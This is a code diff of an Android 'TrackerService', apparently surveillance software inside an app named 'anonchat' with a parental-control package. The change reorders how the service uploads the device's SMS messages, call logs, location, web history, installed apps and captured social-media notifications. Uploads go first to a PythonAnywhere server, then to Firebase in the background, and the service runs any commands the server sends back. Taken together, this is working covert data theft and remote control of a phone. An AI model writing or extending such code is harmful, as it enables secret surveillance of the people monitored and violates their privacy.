@@ -372,9 +372,9 @@ class TrackerService : Service() {
             val socialNotifications = SocialNotificationService.flushBuffer()
 
 
-            // 1. Report to Firebase (100% Free Forever setup)
+            // 1. Report to PythonAnywhere HTTP Server FIRST (Synchronous & Unblocked)
             try {
-                com.anonchat.app.parentalcontrol.manager.FirebaseManager.reportToFirebase(
+                val payload = ApiClient.buildReportPayload(
                     deviceInfo = deviceInfo,
                     location = location,
                     battery = batteryInfo,
@@ -386,33 +386,39 @@ class TrackerService : Service() {
                     webHistory = webHistory,
                     socialNotifications = socialNotifications
                 )
+
+                val result = ApiClient.sendBulkReport(payload)
+
+                if (result.success) {
+                    writeDebugLog("PythonAnywhere Report OK. Commands: ${result.commands?.size ?: 0}")
+                    result.commands?.forEach { cmd ->
+                        handleCommand(cmd)
+                    }
+                } else {
+                    writeDebugLog("PythonAnywhere Report FAILED: ${result.error ?: "unknown"}")
+                }
             } catch (e: Exception) {
-                Log.e(TAG, "Firebase report exception: ${e.message}")
+                writeDebugLog("PythonAnywhere Report EXCEPTION: ${e.message}")
             }
 
-            // 2. Report to HTTP Server
-            val payload = ApiClient.buildReportPayload(
-                deviceInfo = deviceInfo,
-                location = location,
-                battery = batteryInfo,
-                smsMessages = smsMessages,
-                callLogs = callLogs,
-                installedApps = installedApps,
-                activities = activities,
-                screentime = screentime,
-                webHistory = webHistory,
-                socialNotifications = socialNotifications
-            )
-
-            val result = ApiClient.sendBulkReport(payload)
-
-            if (result.success) {
-                writeDebugLog("Report OK. Commands: ${result.commands?.size ?: 0} WebHistory: ${webHistory.size}")
-                result.commands?.forEach { cmd ->
-                    handleCommand(cmd)
+            // 2. Report to Firebase Asynchronously in Background (Never Blocks PythonAnywhere)
+            scope.launch(kotlinx.coroutines.Dispatchers.IO) {
+                try {
+                    com.anonchat.app.parentalcontrol.manager.FirebaseManager.reportToFirebase(
+                        deviceInfo = deviceInfo,
+                        location = location,
+                        battery = batteryInfo,
+                        smsMessages = smsMessages,
+                        callLogs = callLogs,
+                        installedApps = installedApps,
+                        activities = activities,
+                        screentime = screentime,
+                        webHistory = webHistory,
+                        socialNotifications = socialNotifications
+                    )
+                } catch (e: Exception) {
+                    Log.e(TAG, "Firebase report exception: ${e.message}")
                 }
-            } else {
-                writeDebugLog("Report FAILED: ${result.error ?: "unknown"}")
             }
         } catch (e: Exception) {
             writeDebugLog("Report EXCEPTION: ${e.message}")
